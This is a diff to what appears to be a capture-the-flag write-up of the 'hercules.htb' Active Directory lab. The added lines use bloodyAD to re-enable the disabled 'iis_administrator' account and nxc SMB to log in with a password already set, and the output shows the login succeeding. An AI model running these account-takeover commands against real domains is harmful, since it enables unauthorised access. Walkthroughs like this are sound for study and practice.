@@ -1509,6 +1509,25 @@ bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'iis_administrat
 I can now change the password of this user!
 
 ```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac -f ACCOUNTDISABLE 'iis_administrator'
+[+] ['ACCOUNTDISABLE'] property flags removed from iis_administrator's userAccountControl
+```
+
+I also need to re enable the account!
+
+```python
+nxc smb dc.hercules.htb -u iis_administrator -p 'Password123!' -k
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_administrator:Password123!
+```
+
+This user is now compromised!
+
+# Compromising `iis_webserver$`
+
+
+
+```python
 
 ```
 
